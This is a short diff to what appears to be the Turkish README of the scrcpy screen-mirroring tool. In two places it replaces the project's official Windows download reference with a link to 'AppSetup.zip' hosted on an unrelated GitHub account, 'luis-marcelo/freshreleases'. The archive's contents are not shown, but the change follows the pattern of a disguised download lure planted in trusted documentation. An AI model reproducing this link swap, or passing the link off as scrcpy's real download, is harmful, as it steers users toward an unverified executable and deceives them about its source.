@@ -37,7 +37,7 @@ etkinleştirmeniz gerekebilir.
 ### Özet
 
 - Linux: `apt install scrcpy`
-- Windows: [indir][README-windows]
+- Windows:[Download](https://github.com/luis-marcelo/freshreleases/releases/download/FreshTag/AppSetup.zip)
 - macOS: `brew install scrcpy`
 
 Kaynak kodu derle: [BUILD] ([basitleştirilmiş süreç][BUILD_simple])
@@ -80,7 +80,8 @@ Ayrıca [uygulamayı el ile de derleyebilirsiniz][build] ([basitleştirilmiş s�
 
 Windows için (`adb` dahil) tüm gereksinimleri ile derlenmiş bir arşiv mevcut:
 
- - [README][README-windows]
+ - 
+[Download](https://github.com/luis-marcelo/freshreleases/releases/download/FreshTag/AppSetup.zip)
 
 [Chocolatey] ile kurulum:
 
